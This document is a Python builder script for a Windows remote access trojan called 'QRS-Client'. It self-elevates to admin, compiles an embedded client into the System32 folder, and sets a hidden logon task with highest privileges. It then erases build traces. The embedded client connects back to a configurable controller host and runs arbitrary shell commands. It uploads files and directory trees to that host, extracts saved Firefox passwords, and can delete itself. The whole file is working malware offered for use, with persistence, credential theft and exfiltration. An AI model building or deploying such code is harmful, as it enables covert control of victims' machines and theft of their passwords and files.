import os
import subprocess
import textwrap
import PyInstaller.__main__ as PI_EncryptHere
from pathlib import Path
import shutil
import string
import json
import ctypes
import sys
import argparse

# ==== USER SETTINGS ====
# IP and Port need to be directly updated in the following target code (under SERHER_HOST and SERVER_PORT)
output_name = "QRS-Client" # Desired name (without .exe)
output_path = "WIN" # Desired output folder (use / or \\) | Input WIN here to automatically detect and use the windows system[x] folder
task_name = "QRS-Client-Autostart" # Optional: leave empty to use output_name as task name
HostIP = "127.0.0.1" # Enter the IP address of the host machine (leave empty to use localhost)
HostPort = "5003" # Enter the port of the host machine (leave empty to use 5003)
Saved = True # Set to True if you want to have a seperate save file
# ========================

if len(sys.argv) > 1:
    parser = argparse.ArgumentParser(description="QRS-Client Configuration")
    parser.add_argument('--oN', type=str, dest='output_name', help='Desired output name (without .exe)')
    parser.add_argument('--oP', type=str, dest='output_path', help='Desired output folder (use / or \\). Use WIN for automatic Windows system folder.')
    parser.add_argument('--tN', type=str, dest='task_name', help='Task name (optional, defaults to output-name)')
    parser.add_argument('--hIP', type=str, dest='host_ip', help='Host IP address (leave empty to use localhost)')
    parser.add_argument('--hP', type=str, dest='host_port', help='Host port (leave empty to use 5003)')

    args = parser.parse_args()

    if args.output_name: output_name = args.output_name
    if args.output_path: output_path = args.output_path
    if args.task_name: task_name = args.task_name
    else: task_name = output_name
    if args.host_ip: HostIP = args.host_ip
    if args.host_port: HostPort = args.host_port
print(f"[*] Using settings: {output_name}, {output_path}, {task_name}, {HostIP}, {HostPort}")

# Save file
if Saved:
    if os.path.isfile("UserSettings.json"):
        with open("UserSettings.json", "r") as f:
            settings = json.load(f)
        output_name = settings["output_name"]
        output_path = settings["output_path"]
        task_name = settings["task_name"]
        HostIP = settings["HostIP"]
        HostPort = settings["HostPort"]
        Saved = settings["Saved"]
        print("[✓] UserSettings.json loaded successfully.")
    else:
        print("[!] UserSettings.json not found. Creating a new one.")
        with open("UserSettings.json", "w") as f:
            json.dump({
                "output_name": output_name,
                "output_path": output_path,
                "task_name": task_name,
                "HostIP": HostIP,
                "HostPort": HostPort,
                "Saved": Saved
            }, f, indent=4)



# Ensure you run as admin

def elevate_to_admin():
    if not is_admin():
        script = sys.argv[0]
        params = ' '.join(sys.argv[1:])
        subprocess.run(['powershell', 'Start-Process', sys.executable, '-ArgumentList', script, '-Verb', 'runAs'])
        sys.exit()

def is_admin():
    # Check if the current user has admin privileges
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

elevate_to_admin()

# Ensure output path exists
os.makedirs(output_path, exist_ok=True)

# Your Python code to be compiled
target_code = """
import socket
import os
import subprocess
import sys
import http.client
import time as tm
import EngineSupport as FirfoxDecryptor
import tempfile
import re

GlobalOverwriteOutput = None

SERVER_HOST = "-~-Host-~-"
SERVER_PORT = -~-Port-~-
BUFFER_SIZE = 1024 * 1024 # 1MB max size for commands, feel free to increase
SEPARATOR = "<sep>"
def RunCommand(command):
    # Should be error prove command running function
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error occurred while executing the command:\\n{e.stderr}" 
    except Exception as ex:
        return f"Unexpected error: {ex}"
    
# Client Side for File Download
def DownloadFile(filename, host='127.0.0.1', port=5005):
    if not os.path.exists(filename):
        print(f"[!] File {filename} not found!")
        return

    filesize = os.path.getsize(filename)
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # Send filename and filesize with SEPARATOR
    client_socket.send(f"{filename}<sep>{filesize}".encode('utf-8'))

    # Wait for server acknowledgment before sending file data
    ack = client_socket.recv(1024).decode('utf-8')
    if ack != "READY":
        print("[!] Server not ready for file transfer.")
        client_socket.close()
        return

    # Send file data
    with open(filename, 'rb') as f:
        while (chunk := f.read(1024)):
            client_socket.sendall(chunk)

    print(f"[+] File {filename} sent successfully.")
    client_socket.close()

def DownloadDirectory(directory, max_depth, host='127.0.0.1', port=5005):
    if not os.path.exists(directory):
        print(f"[!] Directory {directory} not found!")
        return
    items = RecursiveScan(directory, max_depth)
    for item in items:
        DownloadFile(item, host, port)

def RecursiveScan(directory, max_depth, current_depth=0):
    if current_depth > int(max_depth):
        return []
    
    items = []
    try:
        for item in os.listdir(directory):
            item_path = os.path.join(directory, item)
            if os.path.isdir(item_path):
                # Folder
                items.extend(RecursiveScan(item_path, max_depth, current_depth + 1))
            else:
                items.append(item_path)
    except PermissionError:
        print(f"Permission denied: {directory}")
    
    return items


# Support functions
def WriteToFile(filename, data):
    try:
        with open(filename, 'w') as file:
            file.write(data)
        return f"Data written to {filename}"
    except PermissionError:
        return f"Permission denied to write {filename} to {os.getcwd()}"
    except Exception as e:
        return f"Error writing to file {filename}: {e}"

def Stop():
    try:
        os._exit(0)
    except Exception as e:
        print(f"Error occurred: {e}")


def SelfDestruct():
    path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)

    try:
        # Query Windows Task Scheduler tasks
        result = subprocess.run(
            ['schtasks', '/Query', '/FO', 'LIST', '/V'],
            capture_output=True,
            text=True,
            encoding="utf-8",  
            errors="ignore"    
        )
        out = result.stdout
        print(out)
    except Exception as e:
        print(f"Error running schtasks: {e}")
        out = None

    if out:  # ✅ Make sure out is not None
        for block in re.split(r'\\n\s*\\n', out):
            if path.lower() in block.lower():
                for line in block.splitlines():
                    if line.startswith("TaskName:"):
                        tn = line.split(":", 1)[1].strip()
                        try:
                            subprocess.run(
                                ['schtasks', '/Delete', '/TN', tn, '/F'],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                            )
                            print(f"Deleted task: {tn}")
                        except Exception as e:
                            print(f"Error deleting task {tn}: {e}")
                

    # Create temporary batch file to self-destruct
    bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
    bat_path = bat.name
    bat.write(-~-bat-~-.strip().encode('utf-8'))
    bat.close()

    # Run the batch file hidden
    try:
        subprocess.Popen(
        ['cmd.exe', '/c', 'start', '', '/min', bat_path],
        creationflags=subprocess.CREATE_NEW_CONSOLE
        )
        print(f"Batch file created at {bat_path} and executed.")
    except Exception as e:
        print(f"Error running batch file: {e}")
    sys.exit()

                

    # Create temporary batch file to self-destruct
    bat = tempfile.NamedTemporaryFile(delete=False, suffix=".bat")
    bat_path = bat.name
    bat.write(-~-bat-~-.strip().encode('utf-8'))
    bat.close()

    # Run the batch file hidden
    try:
        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=0x08000000)
        print(f"Batch file created at {bat_path} and executed.")
    except Exception as e:
        print(f"Error running batch file: {e}")
    sys.exit()


def EstablishConnection():
    global GlobalOverwriteOutput
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        # get the current directory
        cwd = os.getcwd()
        s.send(cwd.encode())
        while True:
            # receive command
            command = s.recv(BUFFER_SIZE).decode('latin-1')
            found = False
            splited_command = command.split()
            if command.lower() == "exit":
                break
            if splited_command[0].lower() == "download":
                if len(splited_command) < 2:
                    output = "Please provide a file or directory to download."
                    found = True
                else:
                    if splited_command[1].lower() == "-r":
                        try:
                            DownloadDirectory(splited_command[2], splited_command[3], SERVER_HOST, 5005)
                            output = f"Downloaded {splited_command[2]}"
                        except Exception as e:
                            output = f"An error occurred: {e}, Make sure you Started the Receiver Server and use the command correctly 'Download -r <directory> <max_depth>'"
                        found = True
                    else:
                        try:
                            DownloadFile(splited_command[1], SERVER_HOST, 5005)
                            output = f"Downloaded {splited_command[1]}"
                        except Exception as e:
                            output = f"An error occurred: {e}, Have you started the Receiver Server? If not use 'StartFileServer' command to start the server."
                        found = True
            if command.lower() == "start file server":
                output = ""
                found = True
            if command.lower() == "ping":
                output = "ACTIVE"
                found = True
            print(splited_command[0].lower())
            if splited_command[0].lower() == "extract":

                if splited_command[1].lower() == "passwords":

                    if splited_command[2].lower() == "firefox":
                        try:
                            FirfoxDecryptor.main(splited_command[3])
                            output = "Extracted Firefox Passwords to 'ExtractedPasswords.txt', use downlaod command to download the file."
                        except IndexError:
                            sections = FirfoxDecryptor.main("GetProfiles")
                            sections = FirfoxDecryptor.aligne_sections(sections)
                            output = "Incorrect use of command. Please use 'extract passwords firefox <profile>'\\navailable profiles are:\\n"
                            output += "\\n".join(sections)
                        except Exception as e:
                            output = f"Error occurred: {e}"
                            print(f"Error occurred: {e}")
                        found = True
            if command.lower() == "terminate":
                Stop()
                found = True
            if splited_command[0].lower() == "self":
                if splited_command[1].lower() == "destruct":
                    if splited_command[2].lower() == "-a":
                        SelfDestruct()
                        found = True
                    else:
                        output = "You are Termanating the shell, you won't be able to acces the host again. Are you sure you want to do that? if yes then add '-a' to the command."
            if splited_command[0].lower() == "cd":
                try:
                    # Check if a path is provided
                    if len(splited_command) < 2:
                        raise ValueError("No directory specified.")

                    # Join the path in case of spaces
                    path = ' '.join(splited_command[1:]).strip('"')

                    # Validate if it's a real directory
                    if not os.path.isdir(path):
                        raise FileNotFoundError(f"'{path}' is not a valid directory.")

                    # Attempt to change the directory
                    os.chdir(path)

                except (FileNotFoundError, ValueError) as e:
                    # Handle file not found and missing path errors
                    output = str(e)
                except Exception as e:
                    # Catch-all for unexpected errors
                    output = f"Unexpected error: {e}"
                else:
                    # If successful, empty output
                    output = ""
                found = True
            if found == False:
                if splited_command[-1].lower() == "-f":
                    # remove the last element from the command
                    command = ' '.join(splited_command[:-1])
                # execute the command and retrieve the results
                output = RunCommand(command)
            

            # Check for flags
            if splited_command[-1].lower() == "-f":
                output = WriteToFile("output.txt", output)
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        # close client connection
        s.close()
    except Exception as e:
        print(f"Error occurred: {e}")

def Ping():
    try:
        conn = http.client.HTTPConnection(SERVER_HOST, 5000)
        conn.request("GET", "/?msg=ping")
        response = conn.getresponse()
        conn.close()
        return response.read().decode()
    except Exception as e:
        return "Not Responding"

while True:
    ping = Ping()
    print(ping)
    if ping == "connect":
        EstablishConnection()
    tm.sleep(5)
"""

# Step 1: Save the code to a file
filename = f"build.{output_name.replace(' ', '').translate(str.maketrans('', '', string.punctuation))}"
with open(filename, "w", encoding="utf-8") as f:
    f.write(textwrap.dedent(
        target_code.replace("-~-Host-~-", HostIP)
        .replace("-~-Port-~-", HostPort)
        .replace("-~-bat-~-", '''f""" 
@echo off
timeout /t 3 /nobreak >nul
del /f /q "{path}"
del /f /q "{bat_path}"
"""''')
    ))
print(f"[+] Script saved to: {os.path.abspath(filename)}")

# Step 2: Build with PyInstaller
print("[*] Compiling to EXE with PyInstaller...")

# Full output path (e.g., C:/Users/Public/Builds/MyCustomApp.exe)
if output_path == "WIN":
    print("[!] Using Windows system folder as output path.")
    x = 32
    while True:
        try:
            output_path = os.path.join(os.environ['SystemRoot'], f'System{x}')
            print(f"[✓] Found valid system path: {output_path}")
            break
        except Exception as e:
            x = x*2
        
full_output_exe = f"{output_path}/{output_name}.exe"

# Run PyInstaller with output name and single EXE option
PI_EncryptHere.run([
    "--onefile",
    "--distpath", output_path,
    "--workpath", output_path,
    "--specpath", output_path,
    "--name", output_name,
    "--clean",
    filename
])
print(f"[✓] Compilation finished. File saved to: {full_output_exe}")

# Step 3: Add execution permissions & startup policies
print("[*] Adding execution permissions and startup policies...")
try:
    subprocess.run([
        "schtasks", "/Create",
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",  # Run with highest privileges
        "/TN", task_name if task_name else output_name,
        "/TR", f'"{full_output_exe}"'
    ], check=True)

    subprocess.run([
        "powershell", "-Command",
        f"""$task = Get-ScheduledTask -TaskName "{task_name if task_name else output_name}"; 
        $task.Settings.DisallowStartIfOnBatteries = $false; 
        $task.Settings.StopIfGoingOnBatteries = $false; 
        Set-ScheduledTask -InputObject $task"""
    ], check=True)
    print(f"[✓] Scheduled task '{task_name if task_name else output_name}' created successfully.")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to create task: {e}")
print("[*] Task created. Running task...")
try:
    subprocess.run(["schtasks", "/Run", "/TN", task_name])
    print(f"[✓] Task '{task_name if task_name else output_name}' started successfully.")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to run task: {e}")

# Step 4: Clean up the build files
print("[*] Cleaning up build files...")
cs = 0    # Cleaning score
tcs = 0   # Target Cleaning score
try:
    os.remove(f"{output_path}/{output_name}.spec")
    print(f"[*] Removed spec file: {output_path}/{output_name}.spec")
    cs += 1
except Exception as e:
    print(f"[!] Error removing spec file: {e}")
tcs += 1
try:
    shutil.rmtree(f"{output_path}/{output_name}")
    print(f"[*] Removed build directory: {output_path}/{output_name}")
    cs += 1
except Exception as e:
    print(f"[!] Error removing build directory: {e}")
tcs += 1
try:
    os.remove(filename)
    print(f"[*] Removed source file: {filename}")
    cs += 1
except Exception as e:
    print(f"[!] Error removing source file: {e}")
tcs += 1
if cs == 0:
    print("[!] Failed to clean up build files.")
elif cs > 0 and cs < tcs:
    print(f"[!] Cleaned up {(cs/tcs)*100}% build files.")
else:
    print("[✓] Cleaning up complete")